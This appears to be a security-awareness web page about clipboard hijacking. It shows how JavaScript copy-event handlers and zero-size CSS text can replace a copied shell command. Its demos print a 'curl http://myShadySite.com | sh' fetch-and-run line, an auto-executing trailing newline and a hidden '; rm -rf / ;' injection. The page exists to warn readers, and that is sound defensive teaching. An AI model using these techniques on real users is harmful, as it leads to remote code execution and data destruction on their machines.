

# Don't Copy Paste Into A Shell

When you see a shell command on the Internet, do not copy it into your terminal.

Modern JavaScript Clipboard APIs allow a website to trivially overwrite what you put inside your clipboard, without the user's confirmation or permission.


Here is an example of how easy it is to perform this attack. Imagine that the red text below is a shell command you want to use. Below that is a `textarea` for you to simulate pasting into your shell.


<p id="copyme" style="background-color:#ffcccb;padding:5px;border:1px dashed red;">$ echo "looks safe to me!"</p>

<textarea style="width: 100%"></textarea>


Note that you don't even have to press ENTER in your terminal after pasting for the exploit to happen. The payload conveniently contains a trailing newline that does that for you!

Here is the JavaScript that is performing the exploit.

```
document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo "this could have been [curl http://myShadySite.com | sh]"\n'
    );
    e.preventDefault();
});
```

In addition, disabling JavaScript will not save you! A pure CSS exploit exists as well.

<p id="copyme-css" style="background-color:#ffcccb;padding:5px;border:1px dashed red;">$ echo <span style="font-size: 0;">; rm -rf / ; echo </span> "looks safe to me!"</p>

<textarea style="width: 100%"></textarea>

```
$ echo <span style="font-size: 0;">; rm -rf / ; echo </span> "looks safe to me!"
```


<script>
document.getElementById('copyme').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain', 'echo "this could have been [curl http://myShadySite.com | sh]"\n');
    e.preventDefault();
});
</script>